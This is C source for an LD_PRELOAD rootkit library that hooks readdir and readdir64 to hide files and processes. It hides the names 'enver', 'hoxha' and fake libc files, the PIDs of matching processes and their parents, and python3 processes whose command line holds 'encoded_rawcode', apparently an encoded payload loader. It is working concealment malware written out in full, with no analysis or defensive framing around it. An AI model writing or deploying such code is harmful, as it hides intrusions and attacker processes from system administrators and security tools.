#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <ctype.h>

#define MAX_HIDDEN 32  // Increased to allow dynamic PID entries too

// static names to always hide
static const char *STATIC_HIDE_NAMES[] = {
    "enver",
    "hoxha",
    "libc.so.5",
    "libc.so.4",
    NULL
};

static char *hide_names[MAX_HIDDEN + 1] = { 0 };

// Helpers to add names or PIDs to hide
static void add_hide_name(const char *name) {
    for (int i = 0; i < MAX_HIDDEN; ++i) {
        if (!hide_names[i]) {
            hide_names[i] = strdup(name);
            return;
        }
    }
}

static void add_hide_pid(pid_t pid) {
    char buf[16];
    snprintf(buf, sizeof(buf), "%d", pid);
    add_hide_name(buf);
}

// Initialization to populate hide_names[]
__attribute__((constructor))
static void init_hide_names(void) {
    // Add static entries
    for (int i = 0; STATIC_HIDE_NAMES[i]; ++i) {
        add_hide_name(STATIC_HIDE_NAMES[i]);
    }

    // Scan /proc for dynamic hiding
    DIR *d = opendir("/proc");
    if (!d) return;

    struct dirent *e;
    while ((e = readdir(d))) {
        if (e->d_type != DT_DIR || !isdigit(e->d_name[0])) continue;

        pid_t pid = atoi(e->d_name);

        // Check /proc/[pid]/comm
        char comm_path[64];
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        FILE *f = fopen(comm_path, "r");
        if (!f) continue;

        char name[256];
        if (fgets(name, sizeof(name), f)) {
            name[strcspn(name, "\n")] = 0;

            if (strcmp(name, "hoxha") == 0 || strcmp(name, "enver") == 0) {
                add_hide_pid(pid);

                // Check PPID
                char status_path[64];
                snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);
                FILE *sf = fopen(status_path, "r");
                if (sf) {
                    char line[256];
                    while (fgets(line, sizeof(line), sf)) {
                        if (strncmp(line, "PPid:", 5) == 0) {
                            pid_t ppid = atoi(line + 5);
                            if (ppid > 1) {
                                add_hide_pid(ppid);
                            }
                            break;
                        }
                    }
                    fclose(sf);
                }
            }
        }
        fclose(f);

        // Check /proc/[pid]/cmdline for python3 -c with encoded loader
        char cmdline_path[64];
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
        FILE *cf = fopen(cmdline_path, "r");
        if (cf) {
            char cmdline[4096];
            size_t len = fread(cmdline, 1, sizeof(cmdline) - 1, cf);
            fclose(cf);

            cmdline[len] = '\0';
            if (strstr(cmdline, "python3") && strstr(cmdline, "encoded_rawcode")) {
                add_hide_pid(pid);
            }
        }
    }

    closedir(d);
}

// Cleanup
__attribute__((destructor))
static void cleanup_hide_names(void) {
    for (int i = 0; i < MAX_HIDDEN && hide_names[i]; ++i) {
        free(hide_names[i]);
        hide_names[i] = NULL;
    }
}

// Check if name matches hidden entry
static int libhide(const char *name) {
    for (int i = 0; i < MAX_HIDDEN && hide_names[i]; ++i) {
        if (strcmp(name, hide_names[i]) == 0) return 1;
    }
    return 0;
}

// Hooked readdir() and readdir64()
static struct dirent *(*orig_readdir)(DIR *) = NULL;
static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        union { void *p; struct dirent *(*f)(DIR *); } u;
        u.p = dlsym(RTLD_NEXT, "readdir");
        orig_readdir = u.f;
        if (!orig_readdir) {
            errno = ENOSYS;
            return NULL;
        }
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (libhide(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    if (!orig_readdir64) {
        union { void *p; struct dirent64 *(*f)(DIR *); } u;
        u.p = dlsym(RTLD_NEXT, "readdir64");
        orig_readdir64 = u.f;
        if (!orig_readdir64) {
            errno = ENOSYS;
            return NULL;
        }
    }

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (libhide(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}
